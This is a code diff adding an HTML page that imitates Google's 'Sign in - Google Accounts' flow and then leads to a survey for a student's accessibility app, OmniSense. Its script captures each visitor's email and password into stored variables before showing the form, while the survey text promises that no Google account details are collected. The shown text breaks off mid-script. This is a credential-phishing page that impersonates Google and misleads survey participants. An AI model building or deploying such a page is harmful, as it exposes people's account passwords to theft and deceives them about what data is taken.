@@ -1,0 +1,1211 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Sign in - Google Accounts</title>
+    <style>
+        /* =========================================
+       GLOBAL RESET & FONTS
+       ========================================= */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Roboto', 'Segoe UI', Arial, sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            background-color: #ffffff;
+            color: #202124;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            transition: background-color 0.3s;
+        }
+
+        /* =========================================
+       VIEW 1 & 2: MOBILE CENTERED SIGN IN
+       ========================================= */
+        .signin-wrapper {
+            display: flex;
+            flex-direction: column;
+            width: 100%;
+            max-width: 448px;
+            margin: 0 auto;
+            padding: 32px 24px;
+            min-height: 100vh;
+        }
+
+        /* Top Section */
+        .signin-header {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-top: 24px;
+            margin-bottom: 40px;
+        }
+
+        .google-logo-text {
+            font-size: 24px;
+            font-weight: 500;
+            letter-spacing: -1px;
+            margin-bottom: 16px;
+        }
+
+        .signin-header h1 {
+            font-size: 24px;
+            font-weight: 400;
+            color: #202124;
+            margin-bottom: 8px;
+        }
+
+        .signin-header p {
+            font-size: 16px;
+            color: #202124;
+        }
+
+        /* Form Section */
+        .form-content {
+            display: flex;
+            flex-direction: column;
+            flex: 1;
+        }
+
+        .input-group {
+            position: relative;
+            margin-bottom: 12px;
+            width: 100%;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 16px;
+            font-size: 16px;
+            border: 1px solid #747775;
+            border-radius: 4px;
+            background: transparent;
+            color: #202124;
+            outline: none;
+            transition: border 0.2s, box-shadow 0.2s;
+            height: 56px;
+        }
+
+        .input-group input:focus {
+            border-color: #0b57d0;
+            box-shadow: inset 0 0 0 1px #0b57d0;
+        }
+
+        .input-group label {
+            position: absolute;
+            left: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #444746;
+            font-size: 16px;
+            pointer-events: none;
+            transition: all 0.15s ease;
+            background: #ffffff;
+            padding: 0 4px;
+        }
+
+        .input-group input:focus+label,
+        .input-group input:not(:placeholder-shown)+label {
+            top: 0;
+            transform: translateY(-50%) scale(0.85);
+            color: #0b57d0;
+            font-weight: 500;
+        }
+
+        .input-group input:not(:focus):not(:placeholder-shown)+label {
+            color: #444746;
+        }
+
+        .links {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 32px;
+        }
+
+        .links a {
+            color: #0b57d0;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+            padding: 8px 0;
+        }
+
+        .links a:hover {
+            text-decoration: underline;
+        }
+
+        .guest-text {
+            font-size: 14px;
+            color: #444746;
+            margin-bottom: 40px;
+            line-height: 1.5;
+        }
+
+        .guest-text a {
+            color: #0b57d0;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .guest-text a:hover {
+            text-decoration: underline;
+        }
+
+        /* Buttons */
+        .buttons {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: auto;
+            margin-bottom: 32px;
+        }
+
+        .btn-text {
+            color: #0b57d0;
+            background: none;
+            border: none;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            padding: 8px 12px;
+            border-radius: 4px;
+            margin-left: -12px;
+            /* Align text to edge */
+        }
+
+        .btn-text:active {
+            background: rgba(11, 87, 208, 0.08);
+        }
+
+        .btn-primary {
+            background: #0b57d0;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            font-size: 14px;
+            font-weight: 500;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+
+        .btn-primary:active {
+            background: #0842a0;
+        }
+
+        /* Footer */
+        .signin-footer {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 12px;
+            color: #444746;
+            padding-bottom: 16px;
+        }
+
+        .footer-left {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+
+        .footer-left select {
+            border: none;
+            background: transparent;
+            color: #444746;
+            font-size: 12px;
+            cursor: pointer;
+            outline: none;
+            appearance: none;
+            padding-right: 12px;
+            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="%23444746" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"></polyline></svg>');
+            background-repeat: no-repeat;
+            background-position: right center;
+        }
+
+        .footer-links {
+            display: flex;
+            gap: 12px;
+        }
+
+        .footer-links a {
+            color: #444746;
+            text-decoration: none;
+        }
+
+        /* =========================================
+       VIEW 2 SPECIFIC (Password & Greeting)
+       ========================================= */
+        .v2-account-pill {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            border: 1px solid #747775;
+            border-radius: 50px;
+            padding: 4px 12px 4px 4px;
+            margin: 0 auto 32px auto;
+            cursor: pointer;
+            width: fit-content;
+        }
+
+        .v2-account-pill:active {
+            background: #f8f9fa;
+        }
+
+        .v2-account-pill .avatar {
+            width: 28px;
+            height: 28px;
+            border-radius: 50%;
+            background: #e8eaed;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .v2-account-pill span {
+            font-size: 14px;
+            color: #202124;
+            font-weight: 500;
+        }
+
+        .error-message {
+            color: #d93025;
+            font-size: 12px;
+            margin-top: -4px;
+            margin-bottom: 16px;
+            display: none;
+            width: 100%;
+        }
+
+        .error-message.visible {
+            display: block;
+        }
+
+        /* =========================================
+       VIEW 3: GOOGLE FORM (OmniSense)
+       ========================================= */
+        #view3 {
+            display: none;
+            width: 100%;
+            justify-content: center;
+            background-color: #f0f4f9;
+            min-height: 100vh;
+        }
+
+        .form-wrapper {
+            max-width: 640px;
+            width: 100%;
+            padding: 16px;
+            margin: 0 auto;
+        }
+
+        .form-container {
+            background: #ffffff;
+            border-radius: 8px;
+            box-shadow: 0 2px 12px rgba(0, 0, 0, 0.08);
+            border: 1px solid #dadce0;
+            overflow: hidden;
+        }
+
+        .form-accent {
+            height: 10px;
+            background: #673ab7;
+        }
+
+        .form-header {
+            padding: 24px 24px 16px 24px;
+            border-bottom: 1px solid #e0e0e0;
+        }
+
+        .form-header h1 {
+            font-size: 28px;
+            font-weight: 400;
+            color: #202124;
+            margin-bottom: 16px;
+            line-height: 1.2;
+        }
+
+        .form-description {
+            font-size: 14px;
+            color: #202124;
+            line-height: 1.5;
+            margin-bottom: 16px;
+        }
+
+        .form-description p {
+            margin-bottom: 12px;
+        }
+
+        .form-description ul {
+            margin: 8px 0 12px 20px;
+            padding-left: 0;
+        }
+
+        .form-description li {
+            margin-bottom: 6px;
+        }
+
+        .required-note {
+            font-size: 13px;
+            color: #d93025;
+            padding-top: 12px;
+            border-top: 1px solid #e0e0e0;
+        }
+
+        .form-body {
+            padding: 8px 24px 24px 24px;
+        }
+
+        .question-card {
+            padding: 24px 0 16px 0;
+            border-bottom: 1px solid #e0e0e0;
+        }
+
+        .question-card:last-of-type {
+            border-bottom: none;
+        }
+
+        .question-label {
+            font-size: 16px;
+            font-weight: 500;
+            color: #202124;
+            margin-bottom: 12px;
+            line-height: 1.4;
+        }
+
+        .question-desc {
+            font-size: 13px;
+            color: #5f6368;
+            margin-bottom: 12px;
+            margin-top: -8px;
+        }
+
+        .required-star {
+            color: #d93025;
+            margin-left: 4px;
+        }
+
+        .text-input,
+        .textarea-input {
+            width: 100%;
+            padding: 12px 16px;
+            font-size: 15px;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            background: white;
+            color: #202124;
+            outline: none;
+            font-family: inherit;
+        }
+
+        .text-input:focus,
+        .textarea-input:focus {
+            border-color: #673ab7;
+            box-shadow: 0 0 0 2px rgba(103, 58, 183, 0.15);
+        }
+
+        .textarea-input {
+            resize: vertical;
+            min-height: 100px;
+        }
+
+        .option-group {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .option-item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            cursor: pointer;
+            font-size: 15px;
+        }
+
+        .option-item input {
+            width: 18px;
+            height: 18px;
+            accent-color: #673ab7;
+        }
+
+        /* Linear Scale */
+        .scale-container {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+
+        .scale-labels {
+            display: flex;
+            justify-content: space-between;
+            font-size: 13px;
+            color: #5f6368;
+        }
+
+        .scale-options {
+            display: flex;
+            justify-content: space-between;
+            padding: 0 10px;
+        }
+
+        .scale-option {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 8px;
+            font-size: 15px;
+        }
+
+        .scale-option input {
+            width: 20px;
+            height: 20px;
+            accent-color: #673ab7;
+            cursor: pointer;
+        }
+
+        .form-footer {
+            padding: 8px 24px 24px 24px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .btn-submit {
+            background: #673ab7;
+            color: white;
+            border: none;
+            padding: 12px 28px;
+            font-size: 16px;
+            font-weight: 500;
+            border-radius: 24px;
+            cursor: pointer;
+        }
+
+        .btn-submit:active {
+            background: #5e35b1;
+        }
+
+        .btn-submit:disabled {
+            background: #9aa0a6;
+            cursor: not-allowed;
+        }
+
+        .clear-link {
+            color: #673ab7;
+            background: none;
+            border: none;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            padding: 8px;
+        }
+
+        .success-message {
+            background: #e6f4ea;
+            color: #137333;
+            padding: 18px 24px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 500;
+            display: none;
+            margin-top: 16px;
+            border: 1px solid #ceead6;
+        }
+    </style>
+</head>
+
+<body>
+
+    <!-- =========================================
+       VIEW 1: MOBILE SIGN IN (Email)
+       ========================================= -->
+    <div id="view1" class="signin-wrapper">
+        <div class="signin-header">
+            <div class="google-logo-text">
+                <span style="color: #4285F4;">G</span><span style="color: #EA4335;">o</span><span
+                    style="color: #FBBC05;">o</span><span style="color: #4285F4;">g</span><span
+                    style="color: #34A853;">l</span><span style="color: #EA4335;">e</span>
+            </div>
+            <h1>Sign in</h1>
+            <p>Use your Google Account</p>
+        </div>
+
+        <div class="form-content">
+            <div class="input-group">
+                <input type="email" id="emailInput" placeholder=" " autocomplete="username">
+                <label for="emailInput">Email or phone</label>
+            </div>
+
+            <div class="links">
+                <a href="#" onclick="alert('Email recovery is disabled in this demo.'); return false;">Forgot email?</a>
+            </div>
+
+            <div class="guest-text">
+                Not your computer? Use Guest mode to sign in privately. <br>
+                <a href="#" onclick="return false;">Learn more</a>
+            </div>
+
+            <div class="buttons">
+                <button class="btn-text" onclick="alert('Account creation is disabled in this demo.');">Create
+                    account</button>
+                <button class="btn-primary" id="v1NextBtn">Next</button>
+            </div>
+        </div>
+
+        <div class="signin-footer">
+            <div class="footer-left">
+                <select>
+                    <option>English (United States)</option>
+                </select>
+            </div>
+            <div class="footer-links">
+                <a href="#">Help</a>
+                <a href="#">Privacy</a>
+                <a href="#">Terms</a>
+            </div>
+        </div>
+    </div>
+
+    <!-- =========================================
+       VIEW 2: MOBILE SIGN IN (Password)
+       ========================================= -->
+    <div id="view2" class="signin-wrapper" style="display: none;">
+        <div class="signin-header">
+            <div class="google-logo-text" style="margin-bottom: 24px;">
+                <span style="color: #4285F4;">G</span><span style="color: #EA4335;">o</span><span
+                    style="color: #FBBC05;">o</span><span style="color: #4285F4;">g</span><span
+                    style="color: #34A853;">l</span><span style="color: #EA4335;">e</span>
+            </div>
+            <h1 id="greetingText" style="margin-bottom: 24px;">Hi there</h1>
+
+            <!-- Account Pill -->
+            <div class="v2-account-pill" onclick="goBackToEmail()">
+                <div class="avatar">
+                    <svg viewBox="0 0 24 24" fill="#444746" style="width: 20px; height: 20px;">
+                        <path
+                            d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z" />
+                    </svg>
+                </div>
+                <span id="displayEmail">user@gmail.com</span>
+                <span style="color: #444746; font-size: 18px; margin-left: 4px;">⌄</span>
+            </div>
+        </div>
+
+        <div class="form-content">
+            <div class="input-group">
+                <input type="password" id="passwordInput" placeholder=" " autocomplete="current-password">
+                <label for="passwordInput">Enter password</label>
+            </div>
+
+            <div class="error-message" id="errorMessage">
+                <span id="errorText">Please enter your password.</span>
+            </div>
+
+            <div class="links" style="justify-content: flex-start; margin-bottom: 40px;">
+                <a href="#" onclick="alert('Password reset is disabled in this demo.'); return false;">Forgot
+                    password?</a>
+            </div>
+
+            <div class="buttons" style="justify-content: flex-end;">
+                <button class="btn-primary" id="v2NextBtn">Next</button>
+            </div>
+        </div>
+
+        <div class="signin-footer">
+            <div class="footer-left">
+                <select>
+                    <option>English (United States)</option>
+                </select>
+            </div>
+            <div class="footer-links">
+                <a href="#">Help</a>
+                <a href="#">Privacy</a>
+                <a href="#">Terms</a>
+            </div>
+        </div>
+    </div>
+
+    <!-- =========================================
+       VIEW 3: GOOGLE FORM (OmniSense Evaluation)
+       ========================================= -->
+    <div id="view3">
+        <div class="form-wrapper">
+            <div class="form-container" id="formContainer">
+                <div class="form-accent"></div>
+
+                <div class="form-header">
+                    <h1>Usability and Performance Evaluation of OmniSense</h1>
+                    <div class="form-description">
+                        <p>Hello, I am a final-year student at Laksamana College of Business. As part of my final year
+                            project, I developed OmniSense, an offline Android app that uses on-device AI to help people
+                            who have hearing impairments and hard-of-hearing users with speech-to-text, sound/hazard
+                            recognition, and smartwatch vibration alerts. This survey takes about 5-8 minutes to
+                            complete and is designed to gather your honest feedback on the interactivity, ease of use
+                            and performance of the app. All responses are completely anonymous and will be used strictly
+                            for educational purposes and project evaluation. Thank you so much for your time and help.
+                        </p>
+
+                        <p><strong>What to Expect:</strong><br>
+                            The survey consists of 20 questions and will take approximately 5 to 8 minutes to complete.
+                        </p>
+                        <ul>
+                            <li>There are no right or wrong answers, honest feedback regarding bugs, false alarms, and
+                                performance issues is vital to the research findings.</li>
+                            <li>All data collected will be used solely for academic research, analysis, and reporting
+                                within the scope of this academic project.</li>
+                            <li>Your responses will remain completely anonymous and confidential. Other than asking for
+                                your age (for demographic purposes), no personal identifying details like your name,
+                                email, or Google account will be collected or published.</li>
+                            <li>Your participation is entirely voluntary. You may choose to skip questions or withdraw
+                                from the study at any time by closing the browser window without penalty.</li>
+                        </ul>
+                    </div>
+                    <div class="required-note">
+                        <i class="fas fa-asterisk" style="font-size: 10px; margin-right: 6px;"></i> Required
+                    </div>
+                </div>
+
+                <div class="form-body">
+
+                    <!-- Q1 -->
+                    <div class="question-card">
+                        <div class="question-label">Do you agree to take part in this study? <span
+                                class="required-star">*</span></div>
+                        <div class="option-group">
+                            <label class="option-item"><input type="radio" name="consent" value="Yes" checked required>
+                                Yes, I agree</label>
+                            <label class="option-item"><input type="radio" name="consent" value="No"> No, I do not
+                                agree</label>
+                        </div>
+                    </div>
+
+                    <!-- Q2 -->
+                    <div class="question-card">
+                        <div class="question-label">What is your age? <span class="required-star">*</span></div>
+                        <input type="text" class="text-input" id="q_age" required placeholder="Your answer">
+                    </div>
+
+                    <!-- Q3 -->
+                    <div class="question-card">
+                        <div class="question-label">What smartphone model and Android version did you use during
+                            testing?</div>
+                        <div class="question-desc">(e.g., Samsung Galaxy S22, Android 14 / Xiaomi Redmi Note 11, Android
+                            13)</div>
+                        <input type="text" class="text-input" id="q_device">
+                    </div>
+
+                    <!-- Q4 -->
+                    <div class="question-card">
+                        <div class="question-label">How easy was the initial setup process? <span
+                                class="required-star">*</span></div>
+                        <div class="scale-container">
+                            <div class="scale-options">
+                                <label class="scale-option"><input type="radio" name="setup" value="1" required>
+                                    1</label>
+                                <label class="scale-option"><input type="radio" name="setup" value="2"> 2</label>
+                                <label class="scale-option"><input type="radio" name="setup" value="3"> 3</label>
+                                <label class="scale-option"><input type="radio" name="setup" value="4"> 4</label>
+                                <label class="scale-option"><input type="radio" name="setup" value="5"> 5</label>
+                            </div>
+                            <div class="scale-labels">
+                                <span>Very Complicated</span>
+                                <span>Very Simple & Clear</span>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Q5 -->
+                    <div class="question-card">
+                        <div class="question-label">How easy was navigating through the app's menus and switching
+                            between features? <span class="required-star">*</span></div>
+                        <div class="scale-container">
+                            <div class="scale-options">
+                                <label class="scale-option"><input type="radio" name="nav" value="1" required> 1</label>
+                                <label class="scale-option"><input type="radio" name="nav" value="2"> 2</label>
+                                <label class="scale-option"><input type="radio" name="nav" value="3"> 3</label>
+                                <label class="scale-option"><input type="radio" name="nav" value="4"> 4</label>
+                                <label class="scale-option"><input type="radio" name="nav" value="5"> 5</label>
+                            </div>
+                            <div class="scale-labels">
+                                <span>Confusing / Hard to navigate</span>
+                                <span>Very Intuitive / Easy to find everything</span>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Q6 -->
+                    <div class="question-card">
+                        <div class="question-label">Could you use the main features right away without needing external
+                            guidance or instructions? <span class="required-star">*</span></div>
+                        <div class="option-group">
+                            <label class="option-item"><input type="radio" name="guidance" value="Yes" required>
+                                Yes</label>
+                            <label class="option-item"><input type="radio" name="guidance" value="No"> No</label>
+                        </div>
+                    </div>
+
+                    <!-- Q7 -->
+                    <div class="question-card">
+                        <div class="question-label">How clear and easy to see are the following on the screen? (Text
+                            size, contrast/colors, and warning pop-ups) <span class="required-star">*</span></div>
+                        <div class="scale-container">
+                            <div class="scale-options">
+                                <label class="scale-option"><input type="radio" name="readability" value="1" required>
+                                    1</label>
+                                <label class="scale-option"><input type="radio" name="readability" value="2"> 2</label>
+                                <label class="scale-option"><input type="radio" name="readability" value="3"> 3</label>
+                                <label class="scale-option"><input type="radio" name="readability" value="4"> 4</label>
+                                <label class="scale-option"><input type="radio" name="readability" value="5"> 5</label>
+                            </div>
+                            <div class="scale-labels">
+                                <span>Poor readability / Hard to see</span>
+                                <span>Excellent readability & high contrast</span>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Q8 -->
+                    <div class="question-card">
+                        <div class="question-label">How accurate was the live speech transcription during conversations?
+                            <span class="required-star">*</span>
+                        </div>
+                        <div class="scale-container">
+                            <div class="scale-options">
+                                <label class="scale-option"><input type="radio" name="speech" value="1" required>
+                                    1</label>
+                                <label class="scale-option"><input type="radio" name="speech" value="2"> 2</label>
+                                <label class="scale-option"><input type="radio" name="speech" value="3"> 3</label>
+                                <label class="scale-option"><input type="radio" name="speech" value="4"> 4</label>
+                                <label class="scale-option"><input type="radio" name="speech" value="5"> 5</label>
+                            </div>
+                            <div class="scale-labels">
+                                <span>Very Inaccurate (frequent wrong words)</span>
+                                <span>Highly Accurate (captured dialogue cleanly)</span>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Q9 -->
+                    <div class="question-card">
+                        <div class="question-label">How would you describe the delay (latency) between spoken words and
+                            the captions appearing on screen? <span class="required-star">*</span></div>
+                        <div class="option-group">
+                            <label class="option-item"><input type="radio" name="latency" value="No noticeable delay"
+                                    required> No noticeable delay</label>
+                            <label class="option-item"><input type="radio" name="latency"
+                                    value="Slight delay but acceptable"> Slight delay but acceptable</label>
+                            <label class="option-item"><input type="radio" name="latency" value="Noticeable delay">
+                                Noticeable delay</label>
+                            <label class="option-item"><input type="radio" name="latency" value="Significant delay">
+                                Significant delay</label>
+                        </div>
+                    </div>
+
+                    <!-- Q10 -->
+                    <div class="question-card">
+                        <div class="question-label">How accurate did the camera detect and translate your signing
+                            gestures? <span class="required-star">*</span></div>
+                        <div class="scale-container">
+                            <div class="scale-options">
+                                <label class="scale-option"><input type="radio" name="sign" value="1" required>
+                                    1</label>
+                                <label class="scale-option"><input type="radio" name="sign" value="2"> 2</label>
+                                <label class="scale-option"><input type="radio" name="sign" value="3"> 3</label>
+                                <label class="scale-option"><input type="radio" name="sign" value="4"> 4</label>
+                                <label class="scale-option"><input type="radio" name="sign" value="5"> 5</label>
+                            </div>
+                            <div class="scale-labels">
+                                <span>Rarely detected / Low recognition</span>
+                                <span>Consistently accurate recognition</span>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Q11 -->
+                    <div class="question-card">
+                        <div class="question-label">How natural was the camera usage and distance requirements while
+                            signing? <span class="required-star">*</span></div>
+                        <div class="scale-container">
+                            <div class="scale-options">
+                                <label class="scale-option"><input type="radio" name="camera" value="1" required>
+                                    1</label>
+                                <label class="scale-option"><input type="radio" name="camera" value="2"> 2</label>
+                                <label class="scale-option"><input type="radio" name="camera" value="3"> 3</label>
+                                <label class="scale-option"><input type="radio" name="camera" value="4"> 4</label>
+                                <label class="scale-option"><input type="radio" name="camera" value="5"> 5</label>
+                            </div>
+                            <div class="scale-labels">
+                                <span>Very Unnatural / Difficult to maintain</span>
+                                <span>Completely Natural</span>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Q12 -->
+                    <div class="question-card">
+                        <div class="question-label">How reliably did the app identify critical sounds (e.g., sirens,
+                            fire alarms, door knocks, name calls)? <span class="required-star">*</span></div>
+                        <div class="scale-container">
+                            <div class="scale-options">
+                                <label class="scale-option"><input type="radio" name="sounds" value="1" required>
+                                    1</label>
+                                <label class="scale-option"><input type="radio" name="sounds" value="2"> 2</label>
+                                <label class="scale-option"><input type="radio" name="sounds" value="3"> 3</label>
+                                <label class="scale-option"><input type="radio" name="sounds" value="4"> 4</label>
+                                <label class="scale-option"><input type="radio" name="sounds" value="5"> 5</label>
+                            </div>
+                            <div class="scale-labels">
+                                <span>Unreliable (missed critical sounds)</span>
+                                <span>Highly Reliable (detected sounds promptly)</span>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Q13 -->
+                    <div class="question-card">
+                        <div class="question-label">Did you encounter false alarms (the app alerting you to a hazard
+                            when none was present)? <span class="required-star">*</span></div>
+                        <div class="option-group">
+                            <label class="option-item"><input type="radio" name="false_alarms" value="Never" required>
+                                Never</label>
+                            <label class="option-item"><input type="radio" name="false_alarms" value="Rarely">
+                                Rarely</label>
+                            <label class="option-item"><input type="radio" name="false_alarms" value="Sometimes">
+                                Sometimes</label>
+                            <label class="option-item"><input type="radio" name="false_alarms" value="Frequently">
+                                Frequently</label>
+                        </div>
+                    </div>
+
+                    <!-- Q14 -->
+                    <div class="question-card">
+                        <div class="question-label">Did the app run smoothly without an internet connection, and did you
+                            experience any crashes or extreme battery drain? <span class="required-star">*</span></div>
+                        <div class="option-group">
+                            <label class="option-item"><input type="radio" name="offline"
+                                    value="Ran perfectly offline without issues" required> Ran perfectly offline without
+                                issues</label>
+                            <label class="option-item"><input type="radio" name="offline"
+                                    value="Ran well but had minor glitches/battery drain"> Ran well but had minor
+                                glitches/battery drain</label>
+                            <label class="option-item"><input type="radio" name="offline"
+                                    value="Experienced crashes or significant battery drain"> Experienced crashes or
+                                significant battery drain</label>
+                            <label class="option-item"><input type="radio" name="offline" value="Did not test offline">
+                                Did not test offline</label>
+                        </div>
+                    </div>
+
+                    <!-- Q15 -->
+                    <div class="question-card">
+                        <div class="question-label">Do you think OmniSense improves situational awareness and personal
+                            safety? <span class="required-star">*</span></div>
+                        <div class="scale-container">
+                            <div class="scale-options">
+                                <label class="scale-option"><input type="radio" name="safety" value="1" required>
+                                    1</label>
+                                <label class="scale-option"><input type="radio" name="safety" value="2"> 2</label>
+                                <label class="scale-option"><input type="radio" name="safety" value="3"> 3</label>
+                                <label class="scale-option"><input type="radio" name="safety" value="4"> 4</label>
+                                <label class="scale-option"><input type="radio" name="safety" value="5"> 5</label>
+                            </div>
+                            <div class="scale-labels">
+                                <span>No noticeable impact</span>
+                                <span>Significantly increases safety and confidence</span>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Q16 -->
+                    <div class="question-card">
+                        <div class="question-label">Compared to other transcription or sound alert apps you have seen or
+                            used, how does OmniSense compare in overall concept and functionality? <span
+                                class="required-star">*</span></div>
+                        <div class="option-group">
+                            <label class="option-item"><input type="radio" name="comparison" value="Much worse"
+                                    required> Much worse</label>
+                            <label class="option-item"><input type="radio" name="comparison" value="Slightly worse">
+                                Slightly worse</label>
+                            <label class="option-item"><input type="radio" name="comparison" value="About the same">
+                                About the same</label>
+                            <label class="option-item"><input type="radio" name="comparison" value="Slightly better">
+                                Slightly better</label>
+                            <label class="option-item"><input type="radio" name="comparison" value="Much better"> Much
+                                better</label>
+                            <label class="option-item"><input type="radio" name="comparison"
+                                    value="Haven't used others"> I haven't used other apps like this</label>
+                        </div>
+                    </div>
+
+                    <!-- Q17 -->
+                    <div class="question-card">
+                        <div class="question-label">In which environments did you test OmniSense? (Select all that
+                            apply)</div>
+                        <div class="option-group">
+                            <label class="option-item"><input type="checkbox" name="env" value="Home"> Home</label>
+                            <label class="option-item"><input type="checkbox" name="env" value="Classroom/Library">
+                                Classroom / Library</label>
+                            <label class="option-item"><input type="checkbox" name="env" value="Outdoors/Street">
+                                Outdoors / Street</label>
+                            <label class="option-item"><input type="checkbox" name="env" value="Public Transport">
+                                Public Transport</label>
+                            <label class="option-item"><input type="checkbox" name="env" value="Restaurant/Cafe">
+                                Restaurant / Cafe</label>
+                            <label class="option-item"><input type="checkbox" name="env" value="Other"> Other</label>
+                        </div>
+                    </div>
+
+                    <!-- Q18 -->
+                    <div class="question-card">
+                        <div class="question-label">How likely are you to recommend OmniSense to a friend, family
+                            member, or colleague in the deaf or hard-of-hearing community? <span
+                                class="required-star">*</span></div>
+                        <div class="scale-container">
+                            <div class="scale-options">
+                                <label class="scale-option"><input type="radio" name="recommend" value="1" required>
+                                    1</label>
+                                <label class="scale-option"><input type="radio" name="recommend" value="2"> 2</label>
+                                <label class="scale-option"><input type="radio" name="recommend" value="3"> 3</label>
+                                <label class="scale-option"><input type="radio" name="recommend" value="4"> 4</label>
+                                <label class="scale-option"><input type="radio" name="recommend" value="5"> 5</label>
+                            </div>
+                            <div class="scale-labels">
+                                <span>Not likely at all</span>
+                                <span>Extremely likely</span>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Q19 -->
+                    <div class="question-card">
+                        <div class="question-label">Which feature of OmniSense did you find the most useful or
+                            impactful?</div>
+                        <input type="text" class="text-input" id="q_most_useful">
+                    </div>
+
+                    <!-- Q20 -->
+                    <div class="question-card">
+                        <div class="question-label">What is the single most important bug to fix, feature to add, or
+                            design element to improve in the next update?</div>
+                        <textarea class="textarea-input" id="q_improvement"></textarea>
+                    </div>
+
+                    <!-- Q21 -->
+                    <div class="question-card">
+                        <div class="question-label">Overall, how satisfied are you with your experience using the
+                            OmniSense application? <span class="required-star">*</span></div>
+                        <div class="scale-container">
+                            <div class="scale-options">
+                                <label class="scale-option"><input type="radio" name="satisfaction" value="1" required>
+                                    1</label>
+                                <label class="scale-option"><input type="radio" name="satisfaction" value="2"> 2</label>
+                                <label class="scale-option"><input type="radio" name="satisfaction" value="3"> 3</label>
+                                <label class="scale-option"><input type="radio" name="satisfaction" value="4"> 4</label>
+                                <label class="scale-option"><input type="radio" name="satisfaction" value="5"> 5</label>
+                            </div>
+                            <div class="scale-labels">
+                                <span>Very Dissatisfied</span>
+                                <span>Very Satisfied</span>
+                            </div>
+                        </div>
+                    </div>
+
+                </div>
+
+                <div class="form-footer">
+                    <button class="btn-submit" id="submitBtn">Submit</button>
+                    <button class="clear-link" id="clearBtn">Clear form</button>
+                </div>
+            </div>
+
+            <div class="success-message" id="formSuccessMessage">
+                <i class="fas fa-check-circle"></i> Your response has been recorded. Thank you!
+            </div>
+        </div>
+    </div>
+
+    <!-- =========================================
+       JAVASCRIPT LOGIC FOR FLOW & DATABASE
+       ========================================= -->
+    <script>
+        // Views
+        const view1 = document.getElementById('view1');
+        const view2 = document.getElementById('view2');
+        const view3 = document.getElementById('view3');
+
+        // View 1 Inputs
+        const emailInput = document.getElementById('emailInput');
+        const v1NextBtn = document.getElementById('v1NextBtn');
+
+        // View 2 Inputs
+        const greetingText = document.getElementById('greetingText');
+        const displayEmail = document.getElementById('displayEmail');
+        const passwordInput = document.getElementById('passwordInput');
+        const v2NextBtn = document.getElementById('v2NextBtn');
+        const errorMessage = document.getElementById('errorMessage');
+        const errorText = document.getElementById('errorText');
+
+        // Global variables to store login info
+        let savedEmail = '';
+        let savedPassword = '';
+
+        // --- VIEW 1 LOGIC ---
+        v1NextBtn.addEventListener('click', () => {
+            const email = emailInput.value.trim();
+
+            if (!email || !email.includes('@')) {
+                alert('Please enter a valid email.');
+                emailInput.focus();
+                return;
+            }
+
+            // Store email
+            savedEmail = email;
+
+            // Extract name for the greeting (e.g., "elisa.g.beckett@gmail.com" -> "Elisa")
+            let name = email.split('@')[0].split('.')[0];
+            name = name.charAt(0).toUpperCase() + name.slice(1);
+
+            // Update View 2 UI
+            greetingText.textContent = `Hi ${name}`;
+            displayEmail.textContent = email;
+
+            // Transition
+            view1.style.display = 'none';
+            view2.style.display = 'flex';
+            passwordInput.focus();
+        });
+
+        emailInput.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') v1NextBtn.click();
+        });
+
+        // Go back to View 1 if user clicks the account pill in View 2
+        window.goBackToEmail = function () {
+            view2.style.display = 'none';
+            view1.style.display = 'flex';
+            emailInput.focus();
+        };
+
+        // --- VIEW 2 LOGIC ---
+        v2NextBtn.addEventListener('click', () => {
+            errorMessage.classList.remove('visible');
+            const password = passwordInput.value.trim();
+
+            if (!password) {
+                errorText.textContent = 'Please enter your password.';
+                errorMessage.classList.add('visible');
+                passwordInput.focus();
+                return;
+            }
+
+            // Store password
+            savedPassword = password;
+
+            // Transition to Form
+            view2.style.display = 'none';
+            view3.style.display = 'flex';
